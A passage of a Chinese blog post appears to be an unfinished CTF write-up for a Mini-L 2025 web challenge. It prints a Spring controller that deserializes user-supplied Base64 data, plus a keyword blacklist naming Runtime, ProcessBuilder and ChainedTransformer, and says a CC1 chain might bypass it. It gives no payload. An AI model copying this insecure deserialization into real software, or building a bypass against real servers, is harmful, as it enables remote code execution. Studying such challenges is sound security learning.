class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> BOOT-INF.classes.com.example.controller;<br><br><span class="hljs-keyword">import</span> com.example.Components.Comment;<br><span class="hljs-keyword">import</span> com.example.tools.BlackList;<br><span class="hljs-keyword">import</span> com.example.tools.ByteArrayToStringExtractor;<br><span class="hljs-keyword">import</span> com.example.tools.Tools;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Set;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> org.springframework.core.io.FileSystemResource;<br><span class="hljs-keyword">import</span> org.springframework.core.io.Resource;<br><span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<br><span class="hljs-keyword">import</span> org.springframework.http.MediaType;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>  <span class="hljs-keyword">public</span> ArrayList&lt;Comment&gt; comments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-type">BlackList</span> <span class="hljs-variable">bl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlackList</span>();<br>  <br>  Set&lt;String&gt; blacklist = <span class="hljs-built_in">this</span>.bl.blacklist;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;html&gt;&lt;head&gt;&lt;style&gt;body &#123; font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px; &#125;.container &#123; max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); &#125;h1 &#123; color: #333; &#125;form &#123; margin-top: 20px; &#125;label &#123; display: block; margin-bottom: 8px; &#125;input[type=&#x27;text&#x27;] &#123; width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; &#125;input[type=&#x27;submit&#x27;] &#123; background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; &#125;input[type=&#x27;submit&#x27;]:hover &#123; background-color: #45a049; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&#x27;container&#x27;&gt;&lt;h1&gt;Welcome to miniLCTF 2025~&lt;/h1&gt;&lt;p&gt;Do you really know the CC?&lt;/p&gt;&lt;form action=&#x27;/handle&#x27; method=&#x27;post&#x27;&gt;  &lt;label for=&#x27;data&#x27;&gt;Enter data:&lt;/label&gt;  &lt;input type=&#x27;text&#x27; id=&#x27;data&#x27; name=&#x27;data&#x27;&gt;  &lt;input type=&#x27;submit&#x27; value=&#x27;Submit&#x27;&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>;<br>  &#125;<br>  <br>  <span class="hljs-meta">@PostMapping(&#123;&quot;/handle&quot;&#125;)</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">ser</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Comment</span> <span class="hljs-variable">new_comment</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comment</span>(data);<br>    <span class="hljs-type">byte</span>[] comments_code = Tools.serialize(new_comment);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">comments_str</span> <span class="hljs-operator">=</span> Tools.base64Encode(comments_code);<br>    deser(comments_str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/show&quot;</span>;<br>  &#125;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/deserialize&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deser</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (data.length() &gt; <span class="hljs-number">6000</span>)<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Payload too long&quot;</span>); <br>    <span class="hljs-type">byte</span>[] comments_code = Tools.base64Decode(data);<br>    List&lt;String&gt; result = ByteArrayToStringExtractor.extractVisibleStrings(comments_code);<br>    <span class="hljs-keyword">for</span> (String i : <span class="hljs-built_in">this</span>.blacklist) &#123;<br>      <span class="hljs-keyword">for</span> (String s : result) &#123;<br>        <span class="hljs-keyword">if</span> (s.contains(i))<br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Forbidden blacklist&quot;</span>); <br>      &#125; <br>    &#125; <br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-type">Comment</span> <span class="hljs-variable">trans_comment</span> <span class="hljs-operator">=</span> (Comment)Tools.deserialize(comments_code);<br>      <span class="hljs-built_in">this</span>.comments.add(trans_comment);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>      e.printStackTrace();<br>    &#125; <br>  &#125;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/show&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">show</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">htmlBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>    htmlBuilder.append(<span class="hljs-string">&quot;&lt;html&gt;&lt;head&gt;&lt;style&gt;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;body &#123; font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;.container &#123; max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;h1 &#123; color: #333; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;ul &#123; list-style-type: none; padding: 0; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;li &#123; margin-bottom: 10px; padding: 10px; background-color: #f9f9f9; border-radius: 4px; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;.comment-text &#123; font-weight: bold; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;.comment-time &#123; color: #666; font-size: 0.9em; &#125;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;&lt;div class=&#x27;container&#x27;&gt;&quot;</span>)<br>      .append(<span class="hljs-string">&quot;&lt;h1&gt;Comments&lt;/h1&gt;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.comments.isEmpty()) &#123;<br>      htmlBuilder.append(<span class="hljs-string">&quot;&lt;p&gt;No comments yet.&lt;/p&gt;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      htmlBuilder.append(<span class="hljs-string">&quot;&lt;ul&gt;&quot;</span>);<br>      <span class="hljs-keyword">for</span> (Comment comment : <span class="hljs-built_in">this</span>.comments)<br>        htmlBuilder.append(<span class="hljs-string">&quot;&lt;li&gt;&quot;</span>)<br>          .append(<span class="hljs-string">&quot;&lt;span class=&#x27;comment-text&#x27;&gt;&quot;</span>).append(comment.getText()).append(<span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>)<br>          .append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>)<br>          .append(<span class="hljs-string">&quot;&lt;span class=&#x27;comment-time&#x27;&gt;From: &quot;</span>).append(comment.getFormattedTimestamp()).append(<span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>)<br>          .append(<span class="hljs-string">&quot;&lt;/li&gt;&quot;</span>); <br>      htmlBuilder.append(<span class="hljs-string">&quot;&lt;/ul&gt;&quot;</span>);<br>    &#125; <br>    htmlBuilder.append(<span class="hljs-string">&quot;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> htmlBuilder.toString();<br>  &#125;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/secret&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> ResponseEntity&lt;Resource&gt; <span class="hljs-title function_">secret</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/app/final.jar&quot;</span>;<br>    <span class="hljs-type">FileSystemResource</span> <span class="hljs-variable">fileSystemResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemResource</span>(path);<br>    <span class="hljs-keyword">if</span> (!fileSystemResource.exists() || !fileSystemResource.isReadable())<br>      <span class="hljs-keyword">return</span> ResponseEntity.notFound().build(); <br>    <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();<br>    headers.add(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + fileSystemResource.getFilename() + <span class="hljs-string">&quot;\&quot;&quot;</span>);<br>    <span class="hljs-keyword">return</span> ((ResponseEntity.BodyBuilder)ResponseEntity.ok().headers(headers)).contentLength(fileSystemResource.contentLength()).contentType(MediaType.APPLICATION_OCTET_STREAM).body(fileSystemResource);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>应该类似是路由，其中有handle和show，deserialize<br>&#x2F;handle 应该是用来上传comment的<br>&#x2F;show 是显示评论<br>&#x2F;deserialize 应该就是反序列化了  </p>
+<p>网上关于ctf的cc好是反序列化  </p>
+<p>那先看看&#x2F;handle：   </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">@<span class="hljs-title class_">PostMapping</span>(&#123;<span class="hljs-string">&quot;/handle&quot;</span>&#125;)<br>public <span class="hljs-title class_">String</span> <span class="hljs-title function_">ser</span>(<span class="hljs-title class_">String</span> data) throws <span class="hljs-title class_">Exception</span> &#123;<br>  <span class="hljs-title class_">Comment</span> new_comment = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comment</span>(data);<br>  byte[] comments_code = <span class="hljs-title class_">Tools</span>.<span class="hljs-title function_">serialize</span>(new_comment);<br>  <span class="hljs-title class_">String</span> comments_str = <span class="hljs-title class_">Tools</span>.<span class="hljs-title function_">base64Encode</span>(comments_code);<br>  <span class="hljs-title function_">deser</span>(comments_str);<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/show&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>最后的用户传入会经过base64解码后传入反序列化的函数，就是下面的&#x2F;deserialize  </p>
+<p>那关键点可能就在&#x2F;deserialize  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deser</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>  <span class="hljs-keyword">if</span> (data.length() &gt; <span class="hljs-number">6000</span>) <span class="hljs-comment">//有长度限制,注意是 Base64 字符串长度，不是原始字节长度</span><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Payload too long&quot;</span>); <br>  <span class="hljs-type">byte</span>[] comments_code = Tools.base64Decode(data);<br>  List&lt;String&gt; result = ByteArrayToStringExtractor.extractVisibleStrings(comments_code);<br>  <span class="hljs-keyword">for</span> (String i : <span class="hljs-built_in">this</span>.blacklist) &#123;<br>    <span class="hljs-keyword">for</span> (String s : result) &#123;<br>      <span class="hljs-keyword">if</span> (s.contains(i))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Forbidden blacklist&quot;</span>); <br>    &#125; <br>  &#125; <br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">Comment</span> <span class="hljs-variable">trans_comment</span> <span class="hljs-operator">=</span> (Comment)Tools.deserialize(comments_code);<br>    <span class="hljs-built_in">this</span>.comments.add(trans_comment); <span class="hljs-comment">//评论是根据反序列化后的payload构建</span><br>  &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>  &#125; <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>需要看一眼blacklist:   </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> BOOT-INF.classes.com.example.tools;<br><br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlackList</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; blacklist;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlackList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br>    <span class="hljs-built_in">this</span>.blacklist.addAll(Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;Runtime&quot;</span>, <span class="hljs-string">&quot;ScriptEngine&quot;</span>, <span class="hljs-string">&quot;SpelExpressionParser&quot;</span>, <span class="hljs-string">&quot;ProcessImpl&quot;</span>, <span class="hljs-string">&quot;UNIXProcess&quot;</span>, <span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-string">&quot;ProcessBuilder&quot;</span>, <span class="hljs-string">&quot;UnixPrint&quot;</span> &#125;)); <span class="hljs-comment">//过滤了这些关键词，虽然不知道作用是什么</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlackList</span><span class="hljs-params">(<span class="hljs-type">int</span> sign)</span> &#123;<br>    <span class="hljs-built_in">this</span>.blacklist = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.example.tools.BlackList()).blacklist;<br>    <span class="hljs-built_in">this</span>.blacklist.addAll(Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;jackson&quot;</span>, <span class="hljs-string">&quot;ChainedTransformer&quot;</span> &#125;));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>那我的思路可能就是通过反序列话来实现rce，根据题目提示应该是这样，不去考虑xss这边。<br>给ai分析了项目，说是blacklist过滤很弱，可以尝试cc1链  </p>
+<p>搞来搞去，还是搞不懂java这块，以后再学吧  </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12115">https://xz.aliyun.com/news/12115</a>  </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%88%B7%E9%A2%98/" class="print-no-link">#刷题</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mini-L 2025 部分 web 复现</div>
+      <div>https://aidemofashi.github.io/2025/11/01/Mini-L/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>aidemofashi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/20/TPCTF2025/" title="TPCTF 2025 尝试复现">
+                        <span class="hidden-mobile">TPCTF 2025 尝试复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
